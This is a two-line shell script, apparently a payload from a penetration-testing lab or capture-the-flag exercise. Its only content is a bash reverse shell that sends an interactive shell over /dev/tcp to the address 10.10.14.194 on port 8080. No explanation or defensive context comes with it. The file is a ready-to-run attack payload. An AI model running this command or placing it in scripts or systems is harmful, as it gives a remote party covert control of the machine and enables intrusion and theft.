#!/bin/sh
bash -i >& /dev/tcp/10.10.14.194/8080 0>&1
